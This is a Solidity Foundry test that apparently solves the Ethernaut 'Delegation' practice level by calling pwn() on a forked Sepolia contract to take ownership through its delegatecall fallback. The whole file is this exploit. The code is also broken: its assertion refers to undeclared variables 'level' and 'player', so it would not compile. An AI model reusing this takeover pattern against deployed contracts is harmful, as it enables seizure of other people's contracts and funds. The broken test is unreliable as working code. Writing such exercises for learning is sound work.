// test/Delegation.t.sol
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IDelegation {
    function owner() external view returns (address);
}

interface IDelegate {
    function pwn() external; 
}

contract DelegationTest is Test {
    IDelegation private delegation = IDelegation(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address private me = address(this);

    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_DelegationExploit() public {
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        assertEq(level.owner(), player);
    }
}